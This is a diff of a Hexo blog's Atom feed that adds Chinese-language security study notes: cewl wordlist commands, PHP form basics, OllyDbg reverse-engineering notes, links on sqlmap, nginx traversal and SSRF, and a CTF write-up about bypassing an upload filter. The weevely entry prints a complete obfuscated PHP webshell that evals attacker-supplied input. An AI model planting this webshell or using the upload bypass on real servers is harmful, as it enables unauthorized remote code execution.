@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-03-06T08:16:39.263Z</updated>
+  <updated>2020-03-18T14:16:47.009Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -17,13 +17,381 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>3.18-searchsploit</title>
+    <link href="http://yoursite.com/2020/03/18/3-18-searchsploit/"/>
+    <id>http://yoursite.com/2020/03/18/3-18-searchsploit/</id>
+    <published>2020-03-18T14:16:46.000Z</published>
+    <updated>2020-03-18T14:16:47.009Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>面试准备</title>
+    <link href="http://yoursite.com/2020/03/18/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
+    <id>http://yoursite.com/2020/03/18/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/</id>
+    <published>2020-03-18T13:10:02.000Z</published>
+    <updated>2020-03-18T13:39:19.147Z</updated>
+    
+    <content type="html"><![CDATA[<p>​    逻辑漏洞：</p><p>支付逻辑漏洞</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;​    逻辑漏洞：&lt;/p&gt;
+&lt;p&gt;支付逻辑漏洞&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>3.18-cewl</title>
+    <link href="http://yoursite.com/2020/03/18/3-18-cewl/"/>
+    <id>http://yoursite.com/2020/03/18/3-18-cewl/</id>
+    <published>2020-03-18T12:33:51.000Z</published>
+    <updated>2020-03-18T13:39:43.647Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/network/190128.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/190128.html</a></p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200318205212.png" alt=""></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl <span class="string">http:</span><span class="comment">//192.168.220.133:1898/</span></span><br></pre></td></tr></table></figure><p>爬url的字典</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cewl -w 文件名</span><br><span class="line">存在文件里</span><br><span class="line">cewl -m <span class="number">9</span> -&gt;指定密文最小长度</span><br><span class="line">cewl url -n -e </span><br><span class="line">启用<span class="section">email</span>参数；</span><br><span class="line">cewl url -d <span class="number">3</span></span><br><span class="line">爬取深度默认为<span class="number">2</span></span><br><span class="line">--with-numbers带数字</span><br></pre></td></tr></table></figure><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200318213912.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/network/190128.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/network/19
+      
+    
+    </summary>
+    
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
+    
+      <category term="cewl" scheme="http://yoursite.com/tags/cewl/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>3.17-kali-nc的使用</title>
+    <link href="http://yoursite.com/2020/03/17/3-17-kali-nc%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
+    <id>http://yoursite.com/2020/03/17/3-17-kali-nc%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
+    <published>2020-03-17T13:24:28.000Z</published>
+    <updated>2020-03-17T13:24:28.268Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>3.9-php再学习</title>
+    <link href="http://yoursite.com/2020/03/09/3-9-php%E5%86%8D%E5%AD%A6%E4%B9%A0/"/>
+    <id>http://yoursite.com/2020/03/09/3-9-php%E5%86%8D%E5%AD%A6%E4%B9%A0/</id>
+    <published>2020-03-09T05:11:14.000Z</published>
+    <updated>2020-03-09T10:30:29.724Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200309131145.png" alt=""></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x = <span class="number">5</span>;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $GLOBALS[<span class="string">'x'</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200309150640.png" alt=""></p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200309150940.png" alt=""></p><h2 id="PHP-获取下拉菜单的数据"><a href="#PHP-获取下拉菜单的数据" class="headerlink" title="PHP 获取下拉菜单的数据"></a>PHP 获取下拉菜单的数据</h2><h3 id="PHP-下拉菜单单选"><a href="#PHP-下拉菜单单选" class="headerlink" title="PHP 下拉菜单单选"></a>PHP 下拉菜单单选</h3><p>以下实例我们设置了下拉菜单三个选项，表单使用 GET 方式获取数据，action 属性值为空表示提交到当前脚本，我们可以通过 select 的 name 属性获取下拉菜单的值：</p><h2 id="php-form-select-php-文件代码："><a href="#php-form-select-php-文件代码：" class="headerlink" title="php_form_select.php 文件代码："></a>php_form_select.php 文件代码：</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> $q = <span class="keyword">isset</span>($_GET[<span class="string">'q'</span>])? htmlspecialchars($_GET[<span class="string">'q'</span>]) : <span class="string">''</span>; <span class="keyword">if</span>($q) &#123;        <span class="keyword">if</span>($q ==<span class="string">'RUNOOB'</span>) &#123;                <span class="keyword">echo</span> <span class="string">'菜鸟教程&lt;br&gt;http://www.runoob.com'</span>;        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($q ==<span class="string">'GOOGLE'</span>) &#123;                <span class="keyword">echo</span> <span class="string">'Google 搜索&lt;br&gt;http://www.google.com'</span>;        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($q ==<span class="string">'TAOBAO'</span>) &#123;                <span class="keyword">echo</span> <span class="string">'淘宝&lt;br&gt;http://www.taobao.com'</span>;        &#125; &#125; <span class="keyword">else</span> &#123; <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span>     <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"q"</span>&gt;</span>    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span>选择一个站点:<span class="tag">&lt;/<span class="name">option</span>&gt;</span>    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"RUNOOB"</span>&gt;</span>Runoob<span class="tag">&lt;/<span class="name">option</span>&gt;</span>    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"GOOGLE"</span>&gt;</span>Google<span class="tag">&lt;/<span class="name">option</span>&gt;</span>    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"TAOBAO"</span>&gt;</span>Taobao<span class="tag">&lt;/<span class="name">option</span>&gt;</span>    <span class="tag">&lt;/<span class="name">select</span>&gt;</span>    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span>    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="PHP-下拉菜单多选"><a href="#PHP-下拉菜单多选" class="headerlink" title="PHP 下拉菜单多选"></a>PHP 下拉菜单多选</h3><h2 id="php-form-select-mul-php-文件代码："><a href="#php-form-select-mul-php-文件代码：" class="headerlink" title="php_form_select_mul.php 文件代码："></a>php_form_select_mul.php 文件代码：</h2><hr><h2 id="单选按钮表单"><a href="#单选按钮表单" class="headerlink" title="单选按钮表单"></a>单选按钮表单</h2><p>PHP 单选按钮表单中 name 属性的值是一致的，value 值是不同的，代码如下所示：</p><h2 id="php-form-radio-php-文件代码："><a href="#php-form-radio-php-文件代码：" class="headerlink" title="php_form_radio.php 文件代码："></a>php_form_radio.php 文件代码：</h2><hr><h2 id="checkbox-复选框"><a href="#checkbox-复选框" class="headerlink" title="checkbox 复选框"></a>checkbox 复选框</h2><p>PHP checkbox 复选框可以选择多个值：</p><h2 id="php-form-select-checkbox-php-文件代码："><a href="#php-form-select-checkbox-php-文件代码：" class="headerlink" title="php_form_select_checkbox.php 文件代码："></a>php_form_select_checkbox.php 文件代码：</h2><p><a href="https://www.runoob.com/php/php-forms.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-forms.html</a></p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200309174507.png" alt=""></p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200309182343.png" alt=""></p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200309182554.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;img src=&quot;/images/QQ%E6%88%AA%E5%9B%BE20200309131145.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;s
+      
+    
+    </summary>
+    
+    
+      <category term="note" scheme="http://yoursite.com/categories/note/"/>
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>3.8c/c++</title>
+    <link href="http://yoursite.com/2020/03/08/3-8c-c/"/>
+    <id>http://yoursite.com/2020/03/08/3-8c-c/</id>
+    <published>2020-03-08T05:22:37.000Z</published>
+    <updated>2020-03-08T05:38:23.330Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/images/3.8-2.png" alt=""></p><p><img src="/images/3.8-3.png" alt=""></p><p><a href="http://blog.sina.com.cn/s/blog_614f742b0102vf1a.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_614f742b0102vf1a.html</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;img src=&quot;/images/3.8-2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/3.8-3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://blog.sina.com.cn/s/blog_614f742b0
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>3.7逆向起步</title>
+    <link href="http://yoursite.com/2020/03/07/3-7%E9%80%86%E5%90%91%E8%B5%B7%E6%AD%A5/"/>
+    <id>http://yoursite.com/2020/03/07/3-7%E9%80%86%E5%90%91%E8%B5%B7%E6%AD%A5/</id>
+    <published>2020-03-07T13:06:33.000Z</published>
+    <updated>2020-03-09T04:32:29.551Z</updated>
+    
+    <content type="html"><![CDATA[<p>​    好兄弟说提议web如果一直不得门路，他带我逆向，应该还来得及，暖心；</p><h4 id="书：逆向工程核心原理："><a href="#书：逆向工程核心原理：" class="headerlink" title="书：逆向工程核心原理："></a>书：逆向工程核心原理：</h4><p>从OllyDbg开始：</p><p><img src="/images/3.7-1.png" alt=""></p><p>F2断点，alt B查看</p><p>ct:g 跳转；</p><p>旧版pllydbg</p><p>4种找指定代码的方法</p><p><img src="/images/3.7-2.png" alt=""></p><p>代码执行；字符串查找；SEARCH ALL INTER~查看API；</p><p>压缩器、保护器之后无法读取，于是直接查看DLL库；</p><p>alt b；设置断点；f2</p><p><img src="/images/3.8-1.png" alt=""></p><p>修改字符串：</p><p>2crackme</p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200308214625.png" alt=""></p><p>找转换代码</p><p>；</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;​    好兄弟说提议web如果一直不得门路，他带我逆向，应该还来得及，暖心；&lt;/p&gt;
+&lt;h4 id=&quot;书：逆向工程核心原理：&quot;&gt;&lt;a href=&quot;#书：逆向工程核心原理：&quot; class=&quot;headerlink&quot; title=&quot;书：逆向工程核心原理：&quot;&gt;&lt;/a&gt;书：逆向工程
+      
+    
+    </summary>
+    
+    
+      <category term="note" scheme="http://yoursite.com/categories/note/"/>
+    
+    
+      <category term="逆向" scheme="http://yoursite.com/tags/%E9%80%86%E5%90%91/"/>
+    
+      <category term="二进制" scheme="http://yoursite.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>3.6-docker</title>
+    <link href="http://yoursite.com/2020/03/06/3-6-docker/"/>
+    <id>http://yoursite.com/2020/03/06/3-6-docker/</id>
+    <published>2020-03-06T13:53:18.000Z</published>
+    <updated>2020-03-06T13:53:48.212Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/jishuzhain/article/details/84781350" target="_blank" rel="noopener">https://blog.csdn.net/jishuzhain/article/details/84781350</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/jishuzhain/article/details/84781350&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/jishuzhain/artic
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>3.6-sqlmap的使用用</title>
+    <link href="http://yoursite.com/2020/03/06/3-6-sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E7%94%A8/"/>
+    <id>http://yoursite.com/2020/03/06/3-6-sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E7%94%A8/</id>
+    <published>2020-03-06T13:36:00.000Z</published>
+    <updated>2020-03-06T13:38:32.562Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/6238d01f3b13" target="_blank" rel="noopener">https://www.jianshu.com/p/6238d01f3b13</a></p><p>sqlmap 对应的sql-shell；</p><p>提权路上</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/6238d01f3b13&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/6238d01f3b13&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;sqlmap 
+      
+    
+    </summary>
+    
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
+    
+      <category term="sqlmap" scheme="http://yoursite.com/tags/sqlmap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>nginx目录穿越漏洞</title>
+    <link href="http://yoursite.com/2020/03/06/3-6-nginx%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://yoursite.com/2020/03/06/3-6-nginx%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/</id>
+    <published>2020-03-06T12:50:00.000Z</published>
+    <updated>2020-03-06T13:53:26.286Z</updated>
+    
+    <content type="html"><![CDATA[<p>复现<a href="https://www.cnblogs.com/yuzly/p/11212078.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11212078.html</a></p><p>复现<a href="https://blog.csdn.net/jishuzhain/article/details/84791532" target="_blank" rel="noopener">https://blog.csdn.net/jishuzhain/article/details/84791532</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;复现&lt;a href=&quot;https://www.cnblogs.com/yuzly/p/11212078.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/yuzly/p/11212078.html&lt;/a
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="nginx" scheme="http://yoursite.com/tags/nginx/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>3.6-ssrf漏洞</title>
+    <link href="http://yoursite.com/2020/03/06/3-6-ssrf%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://yoursite.com/2020/03/06/3-6-ssrf%E6%BC%8F%E6%B4%9E/</id>
+    <published>2020-03-06T12:46:05.000Z</published>
+    <updated>2020-03-06T13:51:15.737Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/column/194040.html" target="_blank" rel="noopener">https://www.freebuf.com/column/194040.html</a></p><p><a href="https://blog.csdn.net/fageweiketang/article/details/88983921" target="_blank" rel="noopener">https://blog.csdn.net/fageweiketang/article/details/88983921</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/column/194040.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/column/194040.html&lt;/a&gt;&lt;/p&gt;
+&lt;p
+      
+    
+    </summary>
+    
+    
+      <category term="漏洞" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+      <category term="ssrf" scheme="http://yoursite.com/tags/ssrf/"/>
+    
+      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>3.6kali下dirb目录扫描</title>
+    <link href="http://yoursite.com/2020/03/06/3-6kali%E4%B8%8Bdirb%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/"/>
+    <id>http://yoursite.com/2020/03/06/3-6kali%E4%B8%8Bdirb%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/</id>
+    <published>2020-03-06T11:54:16.000Z</published>
+    <updated>2020-03-06T11:54:16.358Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>3.6-kali下webshell工具weevely</title>
+    <link href="http://yoursite.com/2020/03/06/3-6-kali%E4%B8%8Bwebshell%E5%B7%A5%E5%85%B7weevly/"/>
+    <id>http://yoursite.com/2020/03/06/3-6-kali%E4%B8%8Bwebshell%E5%B7%A5%E5%85%B7weevly/</id>
+    <published>2020-03-06T09:55:32.000Z</published>
+    <updated>2020-03-06T11:46:23.375Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/images/3.6-12.png" alt=""></p><p>图片中其实就把weevly的全部用法概括了，很简单的一个工具，生成php脚本，然后建立连接；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$E=<span class="string">'l=snJtnJnJrlen($t);$onJ="";for($i=0nJnJ;$i&lt;nJ$l;)&#123;fonJr($jnJ=0;($j&lt;$c&amp;'</span>;</span><br><span class="line">$I=<span class="string">'m)==1)nJnJ&#123;@ob_start();@enJvanJl(nJ@gzuncomprenJsnJs(@x(@banJnJse64_'</span>;</span><br><span class="line">$w=<span class="string">'&amp;$i&lt;$l);$jnJ++,$inJ++)&#123;$onJ.=nJ$t&#123;nJnJ$i&#125;^$k&#123;$jnJ&#125;;&#125;nJ&#125;retnJurn $o;&#125;if(@pregnJ'</span>;</span><br><span class="line">$m=<span class="string">'r=@basenJ64_enJnJncode(@xnJ(@gzcomprenJss($nJo),$nJk));prinnJt(nJ"$p$kh$r$kf");&#125;'</span>;</span><br><span class="line">$G=<span class="string">'decode($m[1nJ]),$k)nJ));$onJ=@ob_genJt_conJntenJnts();@ob_endnJ_cleannJ();nJ$'</span>;</span><br><span class="line">$Y=<span class="string">'_matnJch(nJ"/$kh(.+)$kf/nJ",@filnJe_get_nJnJcontents("php:nJ//inJnnJput"),$'</span>;</span><br><span class="line">$u=str_replace(<span class="string">'PF'</span>,<span class="string">''</span>,<span class="string">'crPFPFeatPFe_fPFunPFPFction'</span>);</span><br><span class="line">$P=<span class="string">'$p="htnJ9xv1nJT93OB55jBj"nJ;funnJction x(nJ$nJt,$knJ)&#123;$c=strlen(nJ$knJ);$'</span>;</span><br><span class="line">$x=<span class="string">'$knJ="5fnJ4dcc3b";$nJkh="5aanJ76nJnJ5d61d83";$kf="27nJdeb882nJcfnJ99";'</span>;</span><br><span class="line">$p=str_replace(<span class="string">'nJ'</span>,<span class="string">''</span>,$x.$P.$E.$w.$Y.$I.$G.$m);</span><br><span class="line">$i=$u(<span class="string">''</span>,$p);$i();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;img src=&quot;/images/3.6-12.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;图片中其实就把weevly的全部用法概括了，很简单的一个工具，生成php脚本，然后建立连接；&lt;/p&gt;
+&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;
+      
+    
+    </summary>
+    
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
+    
+      <category term="webshell工具" scheme="http://yoursite.com/tags/webshell%E5%B7%A5%E5%85%B7/"/>
+    
+      <category term="weevely" scheme="http://yoursite.com/tags/weevely/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>3.6-记录一次误打误撞碰到的题</title>
+    <link href="http://yoursite.com/2020/03/06/3-6-%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E8%AF%AF%E6%89%93%E8%AF%AF%E6%92%9E%E7%A2%B0%E5%88%B0%E7%9A%84%E9%A2%98/"/>
+    <id>http://yoursite.com/2020/03/06/3-6-%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E8%AF%AF%E6%89%93%E8%AF%AF%E6%92%9E%E7%A2%B0%E5%88%B0%E7%9A%84%E9%A2%98/</id>
+    <published>2020-03-06T09:33:13.000Z</published>
+    <updated>2020-03-06T09:50:37.901Z</updated>
+    
+    <content type="html"><![CDATA[<p>​    题目来源很搞笑，本来准备做靶机的渗透测试，结果上次安恒月赛留下的一道题的地址呗firefox 保留下来，然后转向一个题目，can you find the flag?</p><p>​    有缘分就做一下，</p><p><img src="/images/3.6-5.png" alt=""></p><p>打开显示一个登录框，试了下会不会注入，因为一点提示都没有；</p><p>但是了注入，没效果，反而会在后面页面显示一个login=errpassword，burpsuite抓包也没有发现异常，然后用drib 扫了一下网站目录，发现了后面的页面uploads，但没有办法直接访问；</p><p><img src="/images/3.6-7.png" alt=""></p><p><img src="/images/3.6-6.png" alt=""></p><p>然后想了想之前做的题目信息在cookie里，翻一下</p><p><img src="/images/3.6-8.png" alt=""></p><p>消息头里有密码；</p><p><img src="/images/3.6-9.png" alt=""></p><p>文件上传题，正好用的是kali，找了一下kali的webshell工具，</p><p><img src="/images/3.6-10.png" alt=""></p><p>自带的生成php脚本，然后上次，发现过滤PHP后缀，于是试着用ISS解析漏洞，加了一个php.jpg，成功绕过；</p><p><img src="/images/3.6-11.png" alt=""></p><p>就是</p><p>​            就是可惜没有提交flag的地方，不过题目也很简单；</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;​    题目来源很搞笑，本来准备做靶机的渗透测试，结果上次安恒月赛留下的一道题的地址呗firefox 保留下来，然后转向一个题目，can you find the flag?&lt;/p&gt;
+&lt;p&gt;​    有缘分就做一下，&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/3.
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>3.6-web安全基础</title>
+    <link href="http://yoursite.com/2020/03/06/3.6-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
+    <id>http://yoursite.com/2020/03/06/3.6-web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</id>
+    <published>2020-03-06T08:47:39.000Z</published>
+    <updated>2020-03-06T09:03:14.829Z</updated>
+    
+    <content type="html"><![CDATA[<p>​    回顾一下web安全的一些基础，夯实自己；学的有点杂了，梳理梳理；</p><p>课程来源：ichunqiu：<a href="https://www.ichunqiu.com/train/course/detail/278/59237" target="_blank" rel="noopener">https://www.ichunqiu.com/train/course/detail/278/59237</a></p><p><img src="/images/3.6-2.png" alt=""></p><p><img src="/images/3.6-3.png" alt=""></p><p><img src="/images/3.6-4.png" alt=""></p><p>​    </p><p>前端：浏览器解析（html,js=）</p><p>后端：web服务器也就是中间件（JSP，PHP，ASP，ASP.NET）</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;​    回顾一下web安全的一些基础，夯实自己；学的有点杂了，梳理梳理；&lt;/p&gt;
+&lt;p&gt;课程来源：ichunqiu：&lt;a href=&quot;https://www.ichunqiu.com/train/course/detail/278/59237&quot; target=&quot;_blan
+      
+    
+    </summary>
+    
+    
+      <category term="note" scheme="http://yoursite.com/categories/note/"/>
+    
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
     <title>3.6-物联网作业-传传感器</title>
     <link href="http://yoursite.com/2020/03/06/3-6-%E7%89%A9%E8%81%94%E7%BD%91%E4%BD%9C%E4%B8%9A-%E4%BC%A0%E4%BC%A0%E6%84%9F%E5%99%A8/"/>
     <id>http://yoursite.com/2020/03/06/3-6-%E7%89%A9%E8%81%94%E7%BD%91%E4%BD%9C%E4%B8%9A-%E4%BC%A0%E4%BC%A0%E6%84%9F%E5%99%A8/</id>
     <published>2020-03-06T08:15:06.000Z</published>
-    <updated>2020-03-06T08:16:39.263Z</updated>
+    <updated>2020-03-06T08:22:14.722Z</updated>
     
-    <content type="html"><![CDATA[<p>​    设计作业1：基于APP Inventor的加速度传感器和方向传感器物联网应用开发</p><p>（1）PPT 1份，10页以内（2）APP操作视频</p><p><a href="https://imgchr.com/i/3q5akj" target="_blank" rel="noopener"><img src="/images/3q5akj.png" alt="3q5akj.png"></a></p>]]></content>
+    <content type="html"><![CDATA[<p>​    设计作业1：基于APP Inventor的加速度传感器和方向传感器物联网应用开发</p><p>（1）PPT 1份，10页以内（2）APP操作视频</p><p><a href="https://imgchr.com/i/3q5akj" target="_blank" rel="noopener"><img src="/images/3q5akj.png" alt="3q5akj.png"></a></p><p><img src="/images/QQ%E6%88%AA%E5%9B%BE20200305001327.png" alt=""></p>]]></content>
     
     <summary type="html">
     
@@ -36,6 +404,8 @@
     
     </summary>
     
+    
+      <category term="note" scheme="http://yoursite.com/categories/note/"/>
     
     
   </entry>
@@ -71,16 +441,15 @@
     <link href="http://yoursite.com/2020/03/06/3.6-lampiao%E6%B8%97%E9%80%8F%EF%BC%88Drupal-%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%EF%BC%89/"/>
     <id>http://yoursite.com/2020/03/06/3.6-lampiao%E6%B8%97%E9%80%8F%EF%BC%88Drupal-%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%EF%BC%89/</id>
     <published>2020-03-05T16:44:11.000Z</published>
-    <updated>2020-03-05T16:45:43.382Z</updated>
+    <updated>2020-03-18T16:35:28.443Z</updated>
     
-    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/kuaile1314/p/11684518.html" target="_blank" rel="noopener">lampiao渗透（Drupal+脏牛提权）</a></p>]]></content>
